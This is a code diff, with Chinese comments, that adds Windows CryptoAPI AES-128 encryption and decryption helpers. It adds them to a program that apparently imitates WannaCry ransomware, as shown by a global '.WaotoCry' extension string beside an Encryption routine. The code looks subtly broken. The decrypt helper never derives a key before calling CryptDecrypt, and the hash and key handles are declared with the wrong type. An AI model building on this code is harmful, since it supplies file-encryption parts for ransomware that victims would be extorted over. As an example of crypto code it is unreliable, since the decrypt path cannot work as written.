@@ -8,7 +8,7 @@ const char* buff = ".WaotoCry";
 全局变量区
 */
 
-
+//AES
 
 int Encryption(char process_path) {
 	int i;
@@ -61,5 +61,85 @@ int Encryption(char process_path) {
 }
 	
 
+//? AES加密数据模块
+int Aes_Encryption_Funtion(BYTE* ppassword, DWORD dwpasswordLength, BYTE* pData, DWORD& dwDatalength, DWORD dwBufferLength) {
+	int bRet;
+	HCRYPTPROV hcryptprov;
+	HCRYPTPROV hCrypthash;
+	HCRYPTPROV hCryptkey;
+	do
+	{
+		//! 获取CSP句柄
+		bRet = ::CryptAcquireContext(&hcryptprov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
+		if (FALSE == bRet)
+		{
+			break;
+		}
+		//!  获取HASH对象 
+		bRet = ::CryptCreateHash(hcryptprov, CALG_MD5, NULL, 0, &hCrypthash);
+		if (false == bRet)
+		{
+			break;
+		}
+		//! 对密钥进行HASH运算
+		bRet = ::CryptHashData(hCrypthash, ppassword, dwpasswordLength, 0);
+		if (false == bRet)
+		{
+			break;
+		}
+		//! 使用HASH生成密钥
+		bRet = ::CryptDeriveKey(hcryptprov, CALG_AES_128, hCrypthash, CRYPT_EXPORTABLE, &hCryptkey);
+		if (false == bRet)
+		{
+			break;
+		}
+		//!? 加密数据
+		bRet = ::CryptEncrypt(hCryptkey, NULL, TRUE, 0, pData, &dwDatalength, dwBufferLength);
+		if (FALSE == bRet)
+		{
+			return 0;
+		}
 
+	} while (FALSE);
+	return bRet;
+}
+
+
+
+//? AES解密模块
+int AES_decrypt_Funtion(BYTE* pPassword, DWORD dwPasswordlength, BYTE* pData, DWORD& dwDataLength, DWORD dwbufferLength) {
+	//! 变量区
+	int bRet;
+	HCRYPTPROV hCryptProv;
+	HCRYPTPROV hCrypthash;
+	HCRYPTPROV hCryptKey;
+	do
+	{
+		//! 获取CSP句柄
+		bRet = ::CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
+		if (FALSE == bRet)
+		{
+			break;
+		}
+		//！ 创建HASH对象
+		bRet = ::CryptCreateHash(hCryptProv, CALG_MD5, NULL, 0, &hCrypthash);
+		if (FALSE == bRet)
+		{
+			break;
+		}
+		//!  开始生成加密密钥
+		bRet = ::CryptHashData(hCrypthash, pPassword, dwPasswordlength, 0);
+		if (FALSE == bRet)
+		{
+			break;
+		}
+		//!? 开始解密数据
+		bRet = ::CryptDecrypt(hCryptKey, NULL, TRUE, 0, pData, &dwDataLength);
+		if (FALSE == bRet)
+		{
+			break;
+		}
+	} while (false);
+	return bRet;
+}
 
